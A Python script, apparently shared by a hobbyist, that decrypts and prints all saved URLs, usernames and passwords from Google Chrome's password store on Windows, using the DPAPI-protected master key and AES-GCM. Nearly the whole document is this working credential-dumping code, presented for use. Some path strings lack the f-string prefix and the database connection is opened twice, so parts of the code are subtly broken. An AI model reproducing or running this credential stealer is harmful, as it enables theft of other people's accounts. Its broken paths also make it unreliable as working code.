# -*- coding: utf-8 -*-
###############################################
# Tweaked by Justin Acevedo in the year 2021  #
###############################################

"""

Description: Was curious to see if Google is using AES for encryption on the Chrome browser password vault. Code was tested on a Windows 10 virtual machine running python3 with success. Pulled all passwords/usernames/urls. 

Design: Just grabbed this code from a slacker box. Cleaned up the automation code to suit my needs simple and to the point. 
"""

import json
import base64
import sqlite3
import win32crypt # pip install pywin32
from Crypto.Cipher import AES # pip install pycryptodome
import shutil

PATH_TO_TEMP = '<your path to source>/temp'

def get_master_key():
    with open('{PATH_TO_TEMP}/local state', encoding='utf-8') as f: # smarter to work with copies that live files
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    # print(master_key)
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
        
    except Exception as e:
        return "chrome version < 80"

if __name__ == '__main__':

    master_key = get_master_key()
    login_db = '{PATH_TO_TEMP}/Login Data'
    shutil.copy2(login_db, '{PATH_TO_TEMP}/chrome_vault.db') #smarter to work with copies that live files
    conn = sqlite3.connect('{PATH_TO_TEMP}/chrome_vault.db')
    conn = sqlite3.connect('{PATH_TO_TEMP}/chrome_vault.db')
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()